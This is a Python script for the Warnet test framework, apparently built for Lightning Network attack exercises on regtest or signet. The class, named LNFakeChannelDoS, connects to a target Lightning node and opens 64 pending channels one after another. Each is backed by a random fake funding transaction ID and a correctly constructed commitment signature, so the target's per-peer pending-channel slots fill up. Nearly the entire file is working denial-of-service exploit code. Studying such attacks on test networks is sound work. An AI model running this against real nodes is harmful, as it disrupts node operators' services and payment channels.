#!/usr/bin/env python3

import hashlib
from io import BytesIO
import random
import time

from commander import Commander
from test_framework.messages import (
    COutPoint,
    CTxIn,
    CTxOut,
    CTransaction,
    CTxInWitness,
    uint256_from_str,
)
from test_framework.script import (
    CScript,
    OP_1,
    OP_16,
    OP_CHECKSIG,
    OP_CHECKSIGVERIFY,
    OP_CHECKSEQUENCEVERIFY,
    OP_ENDIF,
    OP_IFDUP,
    OP_NOTIF,
    SegwitV0SignatureHash,
    SIGHASH_ALL,
)
from test_framework.key import ECKey
from test_framework.script_util import keys_to_multisig_script, script_to_p2wsh_script

########
# This scenario relies on pyln-proto, a python implementation of the Lightning
# Network p2p protocol (including the handshake and noise encryption).
# It is maintained by and used for testing in the Core Lightning project:
# https://github.com/ElementsProject/lightning/tree/master/contrib/pyln-proto
#
# Proper documentation of this library is scarce, but there are lots of good
# examples in a related package, pyln-spec:
# https://github.com/ElementsProject/lightning/tree/master/contrib/pyln-spec
########
from pyln.proto.message import Message, MessageNamespace
from pyln.proto.wire import PrivateKey, PublicKey, connect

# genesis block hash is used as a chain identifer in some messages
GENESIS = {
    "regtest": "0f9188f13cb7b2c71f2a335e3a4fc328bf5beb436012afca590b1a11466e2206",
    "signet": "00000008819873e925422c1ff0f99f7cc9bbb232af63a077a480a3633bee1ef6"
}

# Define p2p messages from BOLT specs
ns = MessageNamespace([
    # bolt01
    "msgtype,init,16",
    "msgdata,init,gflen,u16,",
    "msgdata,init,globalfeatures,byte,gflen",
    "msgdata,init,flen,u16,",
    "msgdata,init,features,byte,flen",
    "msgdata,init,tlvs,init_tlvs,",
    "tlvtype,init_tlvs,networks,1",
    "tlvdata,init_tlvs,networks,chains,chain_hash,...",
    "tlvtype,init_tlvs,remote_addr,3",
    "tlvdata,init_tlvs,remote_addr,data,byte,...",
    "msgtype,error,17",
    "msgdata,error,channel_id,channel_id,",
    "msgdata,error,len,u16,",
    "msgdata,error,data,byte,len",
    "msgtype,warning,1",
    "msgdata,warning,channel_id,channel_id,",
    "msgdata,warning,len,u16,",
    "msgdata,warning,data,byte,len",
    "msgtype,ping,18",
    "msgdata,ping,num_pong_bytes,u16,",
    "msgdata,ping,byteslen,u16,",
    "msgdata,ping,ignored,byte,byteslen",
    "msgtype,pong,19",
    "msgdata,pong,byteslen,u16,",
    "msgdata,pong,ignored,byte,byteslen",
    "tlvtype,n1,tlv1,1",
    "tlvdata,n1,tlv1,amount_msat,tu64,",
    "tlvtype,n1,tlv2,2",
    "tlvdata,n1,tlv2,scid,short_channel_id,",
    "tlvtype,n1,tlv3,3",
    "tlvdata,n1,tlv3,node_id,point,",
    "tlvdata,n1,tlv3,amount_msat_1,u64,",
    "tlvdata,n1,tlv3,amount_msat_2,u64,",
    "tlvtype,n1,tlv4,254",
    "tlvdata,n1,tlv4,cltv_delta,u16,",
    "tlvtype,n2,tlv1,0",
    "tlvdata,n2,tlv1,amount_msat,tu64,",
    "tlvtype,n2,tlv2,11",
    "tlvdata,n2,tlv2,cltv_expiry,tu32,",
    # bolt02
    "msgtype,open_channel,32",
    "msgdata,open_channel,chain_hash,chain_hash,",
    "msgdata,open_channel,temporary_channel_id,byte,32",
    "msgdata,open_channel,funding_satoshis,u64,",
    "msgdata,open_channel,push_msat,u64,",
    "msgdata,open_channel,dust_limit_satoshis,u64,",
    "msgdata,open_channel,max_htlc_value_in_flight_msat,u64,",
    "msgdata,open_channel,channel_reserve_satoshis,u64,",
    "msgdata,open_channel,htlc_minimum_msat,u64,",
    "msgdata,open_channel,feerate_per_kw,u32,",
    "msgdata,open_channel,to_self_delay,u16,",
    "msgdata,open_channel,max_accepted_htlcs,u16,",
    "msgdata,open_channel,funding_pubkey,point,",
    "msgdata,open_channel,revocation_basepoint,point,",
    "msgdata,open_channel,payment_basepoint,point,",
    "msgdata,open_channel,delayed_payment_basepoint,point,",
    "msgdata,open_channel,htlc_basepoint,point,",
    "msgdata,open_channel,first_per_commitment_point,point,",
    "msgdata,open_channel,channel_flags,byte,",
    "msgdata,open_channel,tlvs,open_channel_tlvs,",
    "tlvtype,open_channel_tlvs,upfront_shutdown_script,0",
    "tlvdata,open_channel_tlvs,upfront_shutdown_script,shutdown_scriptpubkey,byte,...",
    "tlvtype,open_channel_tlvs,channel_type,1",
    "tlvdata,open_channel_tlvs,channel_type,type,byte,...",
    "msgtype,accept_channel,33",
    "msgdata,accept_channel,temporary_channel_id,byte,32",
    "msgdata,accept_channel,dust_limit_satoshis,u64,",
    "msgdata,accept_channel,max_htlc_value_in_flight_msat,u64,",
    "msgdata,accept_channel,channel_reserve_satoshis,u64,",
    "msgdata,accept_channel,htlc_minimum_msat,u64,",
    "msgdata,accept_channel,minimum_depth,u32,",
    "msgdata,accept_channel,to_self_delay,u16,",
    "msgdata,accept_channel,max_accepted_htlcs,u16,",
    "msgdata,accept_channel,funding_pubkey,point,",
    "msgdata,accept_channel,revocation_basepoint,point,",
    "msgdata,accept_channel,payment_basepoint,point,",
    "msgdata,accept_channel,delayed_payment_basepoint,point,",
    "msgdata,accept_channel,htlc_basepoint,point,",
    "msgdata,accept_channel,first_per_commitment_point,point,",
    "msgdata,accept_channel,tlvs,accept_channel_tlvs,",
    "tlvtype,accept_channel_tlvs,upfront_shutdown_script,0",
    "tlvdata,accept_channel_tlvs,upfront_shutdown_script,shutdown_scriptpubkey,byte,...",
    "tlvtype,accept_channel_tlvs,channel_type,1",
    "tlvdata,accept_channel_tlvs,channel_type,type,byte,...",
    "msgtype,funding_created,34",
    "msgdata,funding_created,temporary_channel_id,byte,32",
    "msgdata,funding_created,funding_txid,sha256,",
    "msgdata,funding_created,funding_output_index,u16,",
    "msgdata,funding_created,signature,signature,",
    "msgtype,funding_signed,35",
    "msgdata,funding_signed,channel_id,channel_id,",
    "msgdata,funding_signed,signature,signature,",
    "msgtype,channel_ready,36",
    "msgdata,channel_ready,channel_id,channel_id,",
    "msgdata,channel_ready,second_per_commitment_point,point,",
    "msgdata,channel_ready,tlvs,channel_ready_tlvs,",
    "tlvtype,channel_ready_tlvs,short_channel_id,1",
    "tlvdata,channel_ready_tlvs,short_channel_id,alias,short_channel_id,",
    "msgtype,shutdown,38",
    "msgdata,shutdown,channel_id,channel_id,",
    "msgdata,shutdown,len,u16,",
    "msgdata,shutdown,scriptpubkey,byte,len",
    "msgtype,closing_signed,39",
    "msgdata,closing_signed,channel_id,channel_id,",
    "msgdata,closing_signed,fee_satoshis,u64,",
    "msgdata,closing_signed,signature,signature,",
    "msgdata,closing_signed,tlvs,closing_signed_tlvs,",
    "tlvtype,closing_signed_tlvs,fee_range,1",
    "tlvdata,closing_signed_tlvs,fee_range,min_fee_satoshis,u64,",
    "tlvdata,closing_signed_tlvs,fee_range,max_fee_satoshis,u64,",
    "msgtype,update_add_htlc,128",
    "msgdata,update_add_htlc,channel_id,channel_id,",
    "msgdata,update_add_htlc,id,u64,",
    "msgdata,update_add_htlc,amount_msat,u64,",
    "msgdata,update_add_htlc,payment_hash,sha256,",
    "msgdata,update_add_htlc,cltv_expiry,u32,",
    "msgdata,update_add_htlc,onion_routing_packet,byte,1366",
    "msgtype,update_fulfill_htlc,130",
    "msgdata,update_fulfill_htlc,channel_id,channel_id,",
    "msgdata,update_fulfill_htlc,id,u64,",
    "msgdata,update_fulfill_htlc,payment_preimage,byte,32",
    "msgtype,update_fail_htlc,131",
    "msgdata,update_fail_htlc,channel_id,channel_id,",
    "msgdata,update_fail_htlc,id,u64,",
    "msgdata,update_fail_htlc,len,u16,",
    "msgdata,update_fail_htlc,reason,byte,len",
    "msgtype,update_fail_malformed_htlc,135",
    "msgdata,update_fail_malformed_htlc,channel_id,channel_id,",
    "msgdata,update_fail_malformed_htlc,id,u64,",
    "msgdata,update_fail_malformed_htlc,sha256_of_onion,sha256,",
    "msgdata,update_fail_malformed_htlc,failure_code,u16,",
    "msgtype,commitment_signed,132",
    "msgdata,commitment_signed,channel_id,channel_id,",
    "msgdata,commitment_signed,signature,signature,",
    "msgdata,commitment_signed,num_htlcs,u16,",
    "msgdata,commitment_signed,htlc_signature,signature,num_htlcs",
    "msgtype,revoke_and_ack,133",
    "msgdata,revoke_and_ack,channel_id,channel_id,",
    "msgdata,revoke_and_ack,per_commitment_secret,byte,32",
    "msgdata,revoke_and_ack,next_per_commitment_point,point,",
    "msgtype,update_fee,134",
    "msgdata,update_fee,channel_id,channel_id,",
    "msgdata,update_fee,feerate_per_kw,u32,",
    "msgtype,channel_reestablish,136",
    "msgdata,channel_reestablish,channel_id,channel_id,",
    "msgdata,channel_reestablish,next_commitment_number,u64,",
    "msgdata,channel_reestablish,next_revocation_number,u64,",
    "msgdata,channel_reestablish,your_last_per_commitment_secret,byte,32",
    "msgdata,channel_reestablish,my_current_per_commitment_point,point,",
    # bolt07
    "msgtype,query_channel_range,263,gossip_queries",
    "msgdata,query_channel_range,chain_hash,chain_hash,",
    "msgdata,query_channel_range,first_blocknum,u32,",
    "msgdata,query_channel_range,number_of_blocks,u32,",
    "msgdata,query_channel_range,tlvs,query_channel_range_tlvs,",
    "tlvtype,query_channel_range_tlvs,query_option,1",
    "tlvdata,query_channel_range_tlvs,query_option,query_option_flags,bigsize,",
    "msgtype,reply_channel_range,264,gossip_queries",
    "msgdata,reply_channel_range,chain_hash,chain_hash,",
    "msgdata,reply_channel_range,first_blocknum,u32,",
    "msgdata,reply_channel_range,number_of_blocks,u32,",
    "msgdata,reply_channel_range,sync_complete,byte,",
    "msgdata,reply_channel_range,len,u16,",
    "msgdata,reply_channel_range,encoded_short_ids,byte,len",
    "msgdata,reply_channel_range,tlvs,reply_channel_range_tlvs,",
    "tlvtype,reply_channel_range_tlvs,timestamps_tlv,1",
    "tlvdata,reply_channel_range_tlvs,timestamps_tlv,encoding_type,byte,",
    "tlvdata,reply_channel_range_tlvs,timestamps_tlv,encoded_timestamps,byte,...",
    "tlvtype,reply_channel_range_tlvs,checksums_tlv,3",
    "tlvdata,reply_channel_range_tlvs,checksums_tlv,checksums,channel_update_checksums,...",
    "subtype,channel_update_timestamps",
    "subtypedata,channel_update_timestamps,timestamp_node_id_1,u32,",
    "subtypedata,channel_update_timestamps,timestamp_node_id_2,u32,",
    "subtype,channel_update_checksums",
    "subtypedata,channel_update_checksums,checksum_node_id_1,u32,",
    "subtypedata,channel_update_checksums,checksum_node_id_2,u32,",
    "msgtype,gossip_timestamp_filter,265,gossip_queries",
    "msgdata,gossip_timestamp_filter,chain_hash,chain_hash,",
    "msgdata,gossip_timestamp_filter,first_timestamp,u32,",
    "msgdata,gossip_timestamp_filter,timestamp_range,u32,",
])


class LNFakeChannelDoS(Commander):
    def set_test_params(self):
        self.num_nodes = 0

    def add_options(self, parser):
        parser.description = "Send p2p messages directly to a LN node"
        parser.usage = "warnet run /path/to/ln_p2p_message.py [options]"
        parser.add_argument(
            "--peer",
            dest="peer",
            type=str,
            help="The complete uri pubkey@host:port to connect and send messages to",
        )

    def run_test(self):
        # Clear the Warnet default random seed
        random.seed(None)
        # Determine what network we are in
        chain = self.nodes[0].chain
        chain_hash = bytes.fromhex(GENESIS[chain])[::-1].hex()

        # Create an ephemeral identity key for ourselves
        id_privkey = PrivateKey(random.randbytes(32))

        # Establish a p2p connection to the peer
        pk, host = self.options.peer.split("@")
        host, port = host.split(":")
        connection = connect(id_privkey, PublicKey(bytes.fromhex(pk)), host, port)
        self.log.info(f"Connected to node at {pk}@{host}:{port}")

        # Define helper functions for connection I/O
        def send(msg):
            buf = BytesIO()
            msg.write(buf)
            connection.send_message(buf.getvalue())
            self.log.info(f">>> {msg.messagetype} {msg.to_py()}")

        def recv():
            msg = connection.read_message()
            stream = BytesIO(msg)
            try:
                msg = Message.read(ns, stream)
                self.log.info(f"<<< {msg.messagetype} {msg.to_py()}")
                return msg
            except:
                self.log.error(
                    f"Could not parse message from peer:\n{stream.getvalue().hex()}")

        # >>> init
        send(
            Message(
                ns.get_msgtype("init"),
                globalfeatures=b"\x12\x00",
                # feature bits naively copied from a message sent by LND
                features=bytes.fromhex(
                    "800000000000000000000000000000000000000000000000" +
                    "000000000000000000000000000000000000000000000000" +
                    "000000000000000000000000000000000000000000000000" +
                    "000000000000000000000000000000000000000000000000" +
                    "000000000000000000000000000000000000000000000000" +
                    "000000000000000000000000000000000000000000000000" +
                    "000000000000000000000000000000000000000000000000" +
                    "000000000000000000000000000000000000000000000000" +
                    "000000000000000000000000000000000000000000000000" +
                    "000000000000000000000000000000000000000000000000" +
                    "000000000000002000888252a1")
            )
        )
        # <<< init
        recv()

        # <<< query_channel_range
        query_msg = recv()
        # >>> reply_channel_range
        send(
            Message(
                ns.get_msgtype("reply_channel_range"),
                chain_hash=chain_hash,
                first_blocknum=query_msg.fields['first_blocknum'],
                number_of_blocks=query_msg.fields['number_of_blocks'],
                sync_complete=1,
                encoded_short_ids=bytes([0x00])
            )
        )

        # <<< gossip_timestamp_filter (sender can ignore)
        recv()

        def gen_private_key():
            return PrivateKey(random.randbytes(32))

        # max pending channels per peer is 64
        # we can't just generate a new pubkey, we need to run this script again to get a new socket
        for i in range(64):
            funding_privkey = gen_private_key()
            revocation_basepoint_privkey = gen_private_key()
            htlc_basepoint_privkey = gen_private_key()
            payment_basepoint_privkey = gen_private_key()
            delayed_payment_basepoint_privkey = gen_private_key()
            first_per_commitment_point_privkey = gen_private_key()

            open_msg = Message(
                ns.get_msgtype("open_channel"),
                chain_hash=chain_hash,
                temporary_channel_id=random.randbytes(32),
                funding_satoshis=1_000_000,  # 0.01 BTC for example
                push_msat=0,
                dust_limit_satoshis=546,
                max_htlc_value_in_flight_msat=1_000_000_000,
                channel_reserve_satoshis=10_000,
                htlc_minimum_msat=0,
                feerate_per_kw=520,
                to_self_delay=720,
                max_accepted_htlcs=30,
                funding_pubkey=funding_privkey.public_key().to_bytes(),
                revocation_basepoint=revocation_basepoint_privkey.public_key().to_bytes(),
                payment_basepoint=payment_basepoint_privkey.public_key().to_bytes(),
                delayed_payment_basepoint=delayed_payment_basepoint_privkey.public_key().to_bytes(),
                htlc_basepoint=htlc_basepoint_privkey.public_key().to_bytes(),
                first_per_commitment_point=first_per_commitment_point_privkey.public_key().to_bytes(),
                channel_flags=1,
                tlvs={}
            )
            # >>> open_channel
            send(open_msg)
            # <<< accept_channel
            accept_msg = recv()

            fake_funding_txid = random.randbytes(32)
            fake_funding_output_index = 0
            signature = create_commitment_signature(
                commitment_number=0,
                funding_txid=fake_funding_txid,
                funding_output_index=fake_funding_output_index,
                funding_satoshis=open_msg.fields['funding_satoshis'],
                their_funding_pubkey=accept_msg.fields['funding_pubkey'],
                our_funding_privkey=funding_privkey,
                their_delayed_payment_pubkey=accept_msg.fields['delayed_payment_basepoint'],
                their_revocation_pubkey=accept_msg.fields['revocation_basepoint'],
                to_self_delay=open_msg.fields['to_self_delay'],
                feerate_per_kw=open_msg.fields['feerate_per_kw'],
                our_payment_basepoint=open_msg.fields['payment_basepoint'],
                their_payment_basepoint=accept_msg.fields['payment_basepoint'],
            )

            # >>> funding_created
            send(
                Message(
                    ns.get_msgtype("funding_created"),
                    temporary_channel_id=open_msg.fields['temporary_channel_id'],
                    funding_txid=fake_funding_txid,
                    funding_output_index=fake_funding_output_index,
                    signature=signature,
                )
            )
            # <<< funding_signed
            recv()

            print(f"opened fake channel #{i+1}")


def create_commitment_signature(
    commitment_number,
    funding_txid,              # 32 bytes (can be random)
    funding_output_index,      # int
    funding_satoshis,          # int
    their_funding_pubkey,      # 33 bytes
    our_funding_privkey,       # PrivateKey object
    their_delayed_payment_pubkey,  # 33 bytes
    their_revocation_pubkey,   # 33 bytes (derived)
    to_self_delay,             # u16
    feerate_per_kw,            # u32
    our_payment_basepoint,     # 33 bytes (from open_channel)
    their_payment_basepoint,   # 33 bytes (from accept_channel)
):
    obscuring = hashlib.sha256(our_payment_basepoint + their_payment_basepoint).digest()
    obscuring_48 = int.from_bytes(obscuring[26:32], 'big')  # lower 48 bits of 256-bit hash
    obscured = commitment_number ^ obscuring_48

    sequence = 0x80000000 | (obscured >> 24)
    locktime = 0x20000000 | (obscured & 0xFFFFFF)

    # 1. Create the 2-of-2 funding witness script (lexicographic order)
    our_funding_pubkey = our_funding_privkey.public_key().to_bytes()
    pubkeys = sorted([our_funding_pubkey, their_funding_pubkey])
    witness_script = keys_to_multisig_script(pubkeys, k=2)

    # 2. Build *their* commitment transaction (option_anchors for LND compatibility)
    # For "their" commitment with push_msat=0: to_local=0 (omitted), to_remote + to_remote_anchor
    # BOLT #3: weight 1124, subtract fee + 2*330 from funder
    weight = 1124  # option_anchors base commitment weight
    fee = (feerate_per_kw * weight) // 1000
    to_remote_amount = funding_satoshis - fee - 660  # 660 = 2 * 330 anchor outputs

    # to_remote_anchor: 330 sats, locks to our funding key (BOLT #3)
    anchor_script = CScript([
        our_funding_pubkey,
        OP_CHECKSIG,
        OP_IFDUP,
        OP_NOTIF,
        OP_16,
        OP_CHECKSEQUENCEVERIFY,
        OP_ENDIF,
    ])
    to_remote_anchor_p2wsh = bytes(script_to_p2wsh_script(anchor_script))

    # to_remote with anchors: P2WSH to our payment_basepoint + 1-block CSV (BOLT #3)
    to_remote_script = CScript([
        our_payment_basepoint,
        OP_CHECKSIGVERIFY,
        OP_1,
        OP_CHECKSEQUENCEVERIFY,
    ])
    to_remote_p2wsh = bytes(script_to_p2wsh_script(to_remote_script))

    # Output order: BIP 69 (value smallest first) -> 330, then to_remote
    commitment_tx = CTransaction()
    commitment_tx.version = 2
    commitment_tx.vin = [
        CTxIn(
            COutPoint(hash=uint256_from_str(funding_txid), n=funding_output_index),
            scriptSig=b"",
            nSequence=sequence,
        )
    ]
    commitment_tx.vout = [
        CTxOut(nValue=330, scriptPubKey=to_remote_anchor_p2wsh),
        CTxOut(nValue=to_remote_amount, scriptPubKey=to_remote_p2wsh),
    ]
    commitment_tx.nLockTime = locktime
    commitment_tx.wit.vtxinwit = [CTxInWitness()]

    # 3. Create sighash for BIP143 (segwit) using test_framework
    sighash = SegwitV0SignatureHash(
        bytes(witness_script),
        commitment_tx,
        0,
        SIGHASH_ALL,
        funding_satoshis,
    )

    # 4. Sign with our funding private key using ECKey
    ec_key = ECKey()
    ec_key.set(our_funding_privkey.rawkey, compressed=True)
    der_sig = ec_key.sign_ecdsa(sighash)
    # Convert DER to compact 64-byte format (r || s) for lightning
    rlen = der_sig[3]
    slen = der_sig[5 + rlen]
    r = int.from_bytes(der_sig[4:4 + rlen], 'big')
    s = int.from_bytes(der_sig[6 + rlen:6 + rlen + slen], 'big')
    compact_signature = r.to_bytes(32, 'big') + s.to_bytes(32, 'big')
    return compact_signature


def main():
    LNFakeChannelDoS("").main()


if __name__ == "__main__":
    main()
